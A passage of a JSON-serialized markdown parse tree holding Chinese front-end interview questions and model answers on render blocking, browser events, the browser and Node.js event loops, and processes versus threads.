首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","text":" 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **4：**\\n  + 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n  + 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n  + script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n  + 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","task":false,"loose":true,"text":"**4：**\\n+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"**4：**\\n","text":"**4：**","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]}]},{"type":"list","raw":"+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n","task":false,"loose":false,"text":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","tokens":[{"type":"text","raw":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","text":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","tokens":[{"type":"text","raw":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","text":"当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。","escaped":false}]}]},{"type":"list_item","raw":"+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n","task":false,"loose":false,"text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","tokens":[{"type":"text","raw":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","tokens":[{"type":"text","raw":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","escaped":false}]}]},{"type":"list_item","raw":"+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n","task":false,"loose":false,"text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","tokens":[{"type":"text","raw":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","tokens":[{"type":"text","raw":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","escaped":false}]}]},{"type":"list_item","raw":"+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","task":false,"loose":false,"text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的事件机制\\n\\n","depth":2,"text":"浏览器的事件机制","tokens":[{"type":"text","raw":"浏览器的事件机制","text":"浏览器的事件机制","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- 浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","task":false,"loose":false,"text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","tokens":[{"type":"text","raw":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","tokens":[{"type":"text","raw":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","text":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","tokens":[{"type":"text","raw":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","text":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","text":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","tokens":[{"type":"text","raw":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","text":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","text":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","tokens":[{"type":"text","raw":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","text":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的事件循环和node的事件循环区别\\n\\n","depth":2,"text":"浏览器的事件循环和node的事件循环区别","tokens":[{"type":"text","raw":"浏览器的事件循环和node的事件循环区别","text":"浏览器的事件循环和node的事件循环区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- 浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n  首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n  其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n  另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n  首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n  其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n  另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","task":false,"loose":true,"text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","tokens":[{"type":"text","raw":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","tokens":[{"type":"text","raw":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","text":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","tokens":[{"type":"text","raw":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","text":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","text":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","tokens":[{"type":"text","raw":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","text":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","text":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","tokens":[{"type":"text","raw":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","text":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 进程和线程的区别?\\n\\n","depth":2,"text":"进程和线程的区别?","tokens":[{"type":"text","raw":"进程和线程的区别?","text":"进程和线程的区别?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- . 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n\\n- . 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n\\n- 进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n  \\n- 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- . 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n\\n","task":false,"loose":true,"text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n","tokens":[{"type":"text","raw":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n","text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","tokens":[{"type":"text","raw":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","escaped":false}]}]},{"type":"list_item","raw":"- . 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n\\n","task":false,"loose":true,"text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n","tokens":[{"type":"text","raw":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n","text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","tokens":[{"type":"text","raw":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","escaped":false}]}]},{"type":"list_item","raw":"- 进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n  